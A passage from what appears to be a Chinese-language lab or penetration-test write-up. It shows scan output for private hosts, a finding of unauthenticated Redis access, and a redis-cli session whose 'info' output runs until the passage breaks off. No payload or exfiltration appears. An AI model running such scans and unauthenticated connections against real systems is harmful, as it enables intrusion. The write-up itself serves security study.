</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">网站标题</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.100.30</span><span class="p">:</span><span class="mi">8080</span> <span class="n">状态码</span><span class="p">:</span><span class="mi">200</span> <span class="n">长度</span><span class="p">:</span><span class="mi">5976</span>   <span class="n">标题</span><span class="p">:</span><span class="n">智能办公管理系统</span> <span class="o">-</span> <span class="n">智能办公管理系统</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">网站标题</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.100.1</span><span class="p">:</span><span class="mi">3000</span> <span class="n">状态码</span><span class="p">:</span><span class="mi">200</span> <span class="n">长度</span><span class="p">:</span><span class="mi">7801</span>   <span class="n">标题</span><span class="p">:</span><span class="n">智能商城</span> <span class="o">-</span> <span class="n">您的购物天堂</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">网站标题</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.100.40</span><span class="p">:</span><span class="mi">8080</span> <span class="n">状态码</span><span class="p">:</span><span class="mi">200</span> <span class="n">长度</span><span class="p">:</span><span class="mi">7211</span>   <span class="n">标题</span><span class="p">:</span><span class="n">Open</span> <span class="n">WebUI</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">47</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">Redis</span> <span class="mf">192.168.100.20</span><span class="p">:</span><span class="mi">6379</span> <span class="n">发现未授权访问</span> <span class="n">文件位置</span><span class="p">:</span><span class="o">/</span><span class="n">data</span><span class="o">/</span><span class="n">dump</span><span class="o">.</span><span class="n">rdb</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">51</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">Redis无密码连接成功</span><span class="p">:</span> <span class="mf">192.168.100.20</span><span class="p">:</span><span class="mi">6379</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">20</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">51</span><span class="p">]</span> <span class="p">[</span><span class="n">SUCCESS</span><span class="p">]</span> <span class="n">扫描已完成</span><span class="p">:</span> <span class="mi">8</span><span class="o">/</span><span class="mi">8</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>有个redis未授权连接一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">baozhongqi</span><span class="o">&gt;</span> <span class="n">redis</span><span class="o">-</span><span class="n">cli</span> <span class="o">-</span><span class="n">h</span> <span class="mf">192.168.100.20</span> <span class="o">-</span><span class="n">p</span> <span class="mi">6379</span>
</span></span><span class="line"><span class="cl"><span class="mf">192.168.100.20</span><span class="p">:</span><span class="mi">6379</span><span class="o">&gt;</span> <span class="n">info</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Server</span>
</span></span><span class="line"><span class="cl"><span class="n">redis_version</span><span class="p">:</span><span class="mf">7.4.5</span>
</span></span><span class="line"><span class="cl"><span class="n">redis_git_sha1</span><span class="p">:</span><span class="mi">00000000</span>
</span></span><span class="line"><span class="cl"><span class="n">redis_git_dirty</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">redis_build_id</span><span class="p">:</span><span class="mi">14</span><span class="n">ef7c78d3983ab</span>
</span></span><span class="line"><span class="cl"><span class="n">redis_mode</span><span class="p">:</span><span class="n">standalone</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="p">:</span><span class="n">Linux</span> <span class="mf">6.1.0</span><span class="o">-</span><span class="mi">37</span><span class="o">-</span><span class="n">amd64</span> <span class="n">x86_64</span>
</span></span><span class="line"><span class="cl"><span class="n">arch_bits</span><span class="p">:</span><span class="mi">64</span>
</span></span><span class="line"><span class="cl"><span class="n">monotonic_clock</span><span class="p">:</span><span class="n">POSIX</span> <span class="n">clock_gettime</span>
</span></span><span class="line"><span class="cl"><span class="n">multiplexing_api</span><span class="p">:</span><span class="n">epoll</span>
</span></span><span class="line"><span class="cl"><span class="n">atomicvar_api</span><span class="p">:</span><span class="n">c11</span><span class="o">-</span><span class="n">builtin</span>
</span></span><span class="line"><span class="cl"><span class="n">gcc_version</span><span class="p">:</span><span class="mf">14.2.0</span>
</span></span><span class="line"><span class="cl"><span class="n">process_id</span><span class="p">:</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">process_supervised</span><span class="p">:</span><span class="n">no</span>
</span></span><span class="line"><span class="cl"><span class="n">run_id</span><span class="p">:</span><span class="mi">164070046</span><span class="n">b533e020f5f5b58eae4654a63257f43</span>
</span></span><span class="line"><span class="cl"><span class="n">tcp_port</span><span class="p">:</span><span class="mi">6379</span>
</span></span><span class="line"><span class="cl"><span class="n">server_time_usec</span><span class="p">:</span><span class="mi">1758375263434887</span>
</span></span><span class="line"><span class="cl"><span class="n">uptime_in_seconds</span><span class="p">:</span><span class="mi">79981</span>
</span></span><span class="line"><span class="cl"><span class="n">uptime_in_days</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">hz</span><span class="p">:</span><span class="mi">10</span>
</span></span><span class="line"><span class="cl"><span class="n">configured_hz</span><span class="p">:</span><span class="mi">10</span>
</span></span><span class="line"><span class="cl"><span class="n">lru_clock</span><span class="p">:</span><span class="mi">13544799</span>
</span></span><span class="line"><span class="cl"><span class="n">executable</span><span class="p">:</span><span class="o">/</span><span class="n">data</span><span class="o">/</span><span class="n">redis</span><span class="o">-</span><span class="n">server</span>
</span></span><span class="line"><span class="cl"><span class="n">config_file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">io_threads_active</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">listener0</span><span class="p">:</span><span class="n">name</span><span class="o">=</span><span class="n">tcp</span><span class="p">,</span><span class="n">bind</span><span class="o">=*</span><span class="p">,</span><span class="n">bind</span><span class="o">=-</span><span class="p">::</span><span class="o">*</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="mi">6379</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Clients</span>
</span></span><span class="line"><span class="cl"><span class="n">connected_clients</span><span class="p">:</span><span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="n">cluster_connections</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">maxclients</span><span class="p">:</span><span class="mi">10000</span>
</span></span><span class="line"><span class="cl"><span class="n">client_recent_max_input_buffer</span><span class="p">:</span><span class="mi">20480</span>
</span></span><span class="line"><span class="cl"><span class="n">client_recent_max_output_buffer</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">blocked_clients</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">tracking_clients</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">pubsub_clients</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">watching_clients</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">clients_in_timeout_table</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">total_watched_keys</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">total_blocking_keys</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">total_blocking_keys_on_nokey</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Memory</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory</span><span class="p">:</span><span class="mi">1399664</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory_human</span><span class="p">:</span><span class="mf">1.33</span><span class="n">M</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory_rss</span><span class="p">:</span><span class="mi">10629120</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory_rss_human</span><span class="p">:</span><span class="mf">10.14</span><span class="n">M</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory_peak</span><span class="p">:</span><span class="mi">1558104</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory_peak_human</span><span class="p">:</span><span class="mf">1.49</span><span class="n">M</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory_peak_perc</span><span class="p">:</span><span class="mf">89.83</span><span class="o">%</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory_overhead</span><span class="p">:</span><span class="mi">974712</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory_startup</span><span class="p">:</span><span class="mi">946168</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory_dataset</span><span class="p">:</span><span class="mi">424952</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory_dataset_perc</span><span class="p">:</span><span class="mf">93.71</span><span class="o">%</span>
</span></span><span class="line"><span class="cl"><span class="n">allocator_allocated</span><span class="p">:</span><span class="mi">2109640</span>
</span></span><span class="line"><span class="cl"><span class="n">allocator_active</span><span class="p">:</span><span class="mi">2482176</span>
</span></span><span class="line"><span class="cl"><span class="n">allocator_resident</span><span class="p">:</span><span class="mi">5873664</span>
</span></span><span class="line"><span class="cl"><span class="n">allocator_muzzy</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">total_system_memory</span><span class="p">:</span><span class="mi">7992999936</span>
</span></span><span class="line"><span class="cl"><span class="n">total_system_memory_human</span><span class="p">:</span><span class="mf">7.44</span><span class="n">G</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory_lua</span><span class="p">:</span><span class="mi">31744</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory_vm_eval</span><span class="p">:</span><span class="mi">31744</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory_lua_human</span><span class="p">:</span><span class="mf">31.00</span><span class="n">K</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory_scripts_eval</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">number_of_cached_scripts</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">number_of_functions</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">number_of_libraries</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory_vm_functions</span><span class="p">:</span><span class="mi">32768</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory_vm_total</span><span class="p">:</span><span class="mi">64512</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory_vm_total_human</span><span class="p">:</span><span class="mf">63.00</span><span class="n">K</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory_functions</span><span class="p">:</span><span class="mi">192</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory_scripts</span><span class="p">:</span><span class="mi">192</span>
</span></span><span class="line"><span class="cl"><span class="n">used_memory_scripts_human</span><span class="p">:</span><span class="mi">192</span><span class="n">B</span>
</span></span><span class="line"><span class="cl"><span class="n">maxmemory</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">maxmemory_human</span><span class="p">:</span><span class="mi">0</span><span class="n">B</span>
</span></span><span class="line"><span class="cl"><span class="n">maxmemory_policy</span><span class="p">:</span><span class="n">noeviction</span>
</span></span><span class="line"><span class="cl"><span class="n">allocator_frag_ratio</span><span class="p">:</span><span class="mf">1.18</span>
</span></span><span class="line"><span class="cl"><span class="n">allocator_frag_bytes</span><span class="p">:</span><span class="mi">296504</span>
</span></span><span class="line"><span class="cl"><span class="n">allocator_rss_ratio</span><span class="p">:</span><span class="mf">2.37</span>
</span></span><span class="line"><span class="cl"><span class="n">allocator_rss_bytes</span><span class="p">:</span><span class="mi">3391488</span>
</span></span><span class="line"><span class="cl"><span class="n">rss_overhead_ratio</span><span class="p">:</span><span class="mf">1.81</span>
</span></span><span class="line"><span class="cl"><span class="n">rss_overhead_bytes</span><span class="p">:</span><span class="mi">4755456</span>
</span></span><span class="line"><span class="cl"><span class="n">mem_fragmentation_ratio</span><span class="p">:</span><span class="mf">7.60</span>
</span></span><span class="line"><span class="cl"><span class="n">mem_fragmentation_bytes</span><span class="p">:</span><span class="mi">9231280</span>
</span></span><span class="line"><span class="cl"><span class="n">mem_not_counted_for_evict</span><span class="p">:</span><span class="mi">640</span>
</span></span><span class="line"><span class="cl"><span class="n">mem_replication_backlog</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">mem_total_replication_buffers</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">mem_clients_slaves</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">mem_clients_normal</span><span class="p">:</span><span class="mi">26256</span>
</span></span><span class="line"><span class="cl"><span class="n">mem_cluster_links</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">mem_aof_buffer</span><span class="p">:</span><span class="mi">640</span>
</span></span><span class="line"><span class="cl"><span class="n">mem_allocator</span><span class="p">:</span><span class="n">jemalloc</span><span class="o">-</span><span class="mf">5.3.0</span>
</span></span><span class="line"><span class="cl"><span class="n">mem_overhead_db_hashtable_rehashing</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">active_defrag_running</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">lazyfree_pending_objects</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">lazyfreed_objects</span><span class="p">:</span><span class="mi">9</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Persistence</span>
</span></span><span class="line"><span class="cl"><span class="n">loading</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">async_loading</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">current_cow_peak</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">current_cow_size</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">current_cow_size_age</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">current_fork_perc</span><span class="p">:</span><span class="mf">0.00</span>
</span></span><span class="line"><span class="cl"><span class="n">current_save_keys_processed</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">current_save_keys_total</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">rdb_changes_since_last_save</span><span class="p">:</span><span class="mi">12</span>
</span></span><span class="line"><span class="cl"><span class="n">rdb_bgsave_in_progress</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">rdb_last_save_time</span><span class="p">:</span><span class="mi">1758372929</span>
</span></span><span class="line"><span class="cl"><span class="n">rdb_last_bgsave_status</span><span class="p">:</span><span class="n">ok</span>
</span></span><span class="line"><span class="cl"><span class="n">rdb_last_bgsave_time_sec</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">rdb_current_bgsave_time_sec</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">rdb_saves</span><span class="p">:</span><span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="n">rdb_last_cow_size</span><span class="p">:</span><span class="mi">380928</span>
</span></span><span class="line"><span class="cl"><span class="n">rdb_last_load_keys_expired</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">rdb_last_load_keys_loaded</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">aof_enabled</span><span class="p">:</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">aof_rewrite_in_progress</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">aof_rewrite_scheduled</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">aof_last_rewrite_time_sec</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">aof_current_rewrite_time_sec</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">aof_last_bgrewrite_status</span><span class="p">:</span><span class="n">ok</span>
</span></span><span class="line"><span class="cl"><span class="n">aof_rewrites</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">aof_rewrites_consecutive_failures</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">aof_last_write_status</span><span class="p">:</span><span class="n">ok</span>
</span></span><span class="line"><span class="cl"><span class="n">aof_last_cow_size</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">module_fork_in_progress</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">module_fork_last_cow_size</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">aof_current_size</span><span class="p">:</span><span class="mi">2697</span>
</span></span><span class="line"><span class="cl"><span class="n">aof_base_size</span><span class="p">:</span><span class="mi">88</span>
</span></span><span class="line"><span class="cl"><span class="n">aof_pending_rewrite</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">aof_buffer_length</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">aof_pending_bio_fsync</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">aof_delayed_fsync</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Stats</span>
</span></span><span class="line"><span class="cl"><span class="n">total_connections_received</span><span class="p">:</span><span class="mi">7989</span>
</span></span><span class="line"><span class="cl"><span class="n">total_commands_processed</span><span class="p">:</span><span class="mi">10969</span>
</span></span><span class="line"><span class="cl"><span class="n">instantaneous_ops_per_sec</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">total_net_input_bytes</span><span class="p">:</span><span class="mi">164092</span>
</span></span><span class="line"><span class="cl"><span class="n">total_net_output_bytes</span><span class="p">:</span><span class="mi">409348</span>
</span></span><span class="line"><span class="cl"><span class="n">total_net_repl_input_bytes</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">total_net_repl_output_bytes</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">instantaneous_input_kbps</span><span class="p">:</span><span class="mf">0.00</span>
</span></span><span class="line"><span class="cl"><span class="n">instantaneous_output_kbps</span><span class="p">:</span><span class="mf">0.00</span>
</span></span><span class="line"><span class="cl"><span class="n">instantaneous_input_repl_kbps</span><span class="p">:</span><span class="mf">0.00</span>
</span></span><span class="line"><span class="cl"><span class="n">instantaneous_output_repl_kbps</span><span class="p">:</span><span class="mf">0.00</span>
</span></span><span class="line"><span class="cl"><span class="n">rejected_connections</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">sync_full</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">sync_partial_ok</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">sync_partial_err</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">expired_subkeys</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">expired_keys</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">expired_stale_perc</span><span class="p">:</span><span class="mf">0.00</span>
</span></span><span class="line"><span class="cl"><span class="n">expired_time_cap_reached_count</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">expire_cycle_cpu_milliseconds</span><span class="p">:</span><span class="mi">1120</span>
</span></span><span class="line"><span class="cl"><span class="n">evicted_keys</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">evicted_clients</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">evicted_scripts</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">total_eviction_exceeded_time</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">current_eviction_exceeded_time</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">keyspace_hits</span><span class="p">:</span><span class="mi">164</span>
</span></span><span class="line"><span class="cl"><span class="n">keyspace_misses</span><span class="p">:</span><span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="n">pubsub_channels</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">pubsub_patterns</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">pubsubshard_channels</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">latest_fork_usec</span><span class="p">:</span><span class="mi">258</span>
</span></span><span class="line"><span class="cl"><span class="n">total_forks</span><span class="p">:</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">migrate_cached_sockets</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">slave_expires_tracked_keys</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">active_defrag_hits</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">active_defrag_misses</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">active_defrag_key_hits</span><span class="p">:</span><span class="mi">0</span>
